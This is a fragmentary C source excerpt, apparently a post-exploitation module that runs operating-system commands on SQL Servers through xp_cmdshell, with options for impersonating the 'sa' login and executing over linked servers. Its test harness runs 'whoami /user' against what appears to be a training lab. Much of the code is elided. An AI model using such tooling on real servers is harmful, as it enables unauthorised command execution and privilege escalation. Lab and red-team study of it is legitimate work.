...
void ExecuteXpCmd(char *server, char *database, char *link, char *impersonate,
  ...
  //
  ret = ODBC32$SQLSetStmtAttr(stmt, SQL_ATTR_QUERY_TIMEOUT,
  ...
  if (link == NULL) {
    ...
    totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(command) +
    ...
    internal_printf("[*] Command executed (Output not returned for linked "
                    "server cmd execution)\n");
  }
...
int main() {
  ...
  ExecuteXpCmd("castelblack.north.sevenkingdoms.local", "master", NULL, NULL,
               "whoami /user", NULL, NULL);

  internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
  ExecuteXpCmd("castelblack.north.sevenkingdoms.local", "master", NULL, "sa",
               "whoami /user", NULL, NULL);

  internal_printf("\n\n============ LINK TEST ============\n\n");
  ExecuteXpCmd("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS",
               NULL, "whoami /user", NULL, NULL);
}
